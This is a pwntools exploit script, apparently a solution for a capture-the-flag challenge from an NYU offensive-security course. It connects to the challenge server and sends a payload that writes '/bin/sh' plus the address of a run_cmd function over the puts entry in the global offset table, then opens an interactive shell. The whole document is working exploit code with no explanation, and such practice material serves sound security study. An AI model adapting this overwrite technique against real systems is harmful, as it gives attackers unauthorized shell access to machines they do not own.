from pwn import *

e = ELF('./git_got_good')
context.log_level = 'debug'
context.arch = "amd64"
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#p = process('./git_got_good')
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1341)
#gdb.attach(p, gdbscript='b *main+132')

p.sendlineafter(b'):', b'rt1726')

p.sendlineafter(b'to save:', b'/bin/sh\0' + p64(e.sym.run_cmd) + p64(e.sym.got.puts-8))

p.interactive()